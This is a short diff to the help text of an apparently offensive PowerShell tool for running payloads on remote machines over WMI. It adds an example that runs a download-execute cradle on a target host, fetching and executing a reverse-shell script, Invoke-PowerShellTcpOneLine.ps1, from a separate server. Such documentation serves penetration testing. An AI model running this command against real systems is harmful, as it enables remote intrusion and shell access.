@@ -64,8 +64,14 @@ Name             : ConsoleHost
 Version          : 5.1.14409.1005
 --------------------------------
 
-Use above to execute custom payloads non-interactively. You can use powershell -e <encodedcommand> for running scripts or use
-the payloadscript parameter.
+Use above to execute custom payloads non-interactively. You can use powershell -e <encodedcommand> for running scripts, download-execute
+cradle or use the payloadscript parameter.
+
+.EXAMPLE
+
+PS C:\> Invoke-PowerShellWmi -ComputerName 192.168.0.35 -UserName opsdc\wmidadmin -Verbose -Payload "powershell iex (New-Object Net.WebClient).DownloadString('http://192.168.11.2:8080/Invoke-PowerShellTcpOneLine.ps1')"
+
+Use above to use download-execute cradle to execute PowerShell scripts.
 
 .EXAMPLE
 
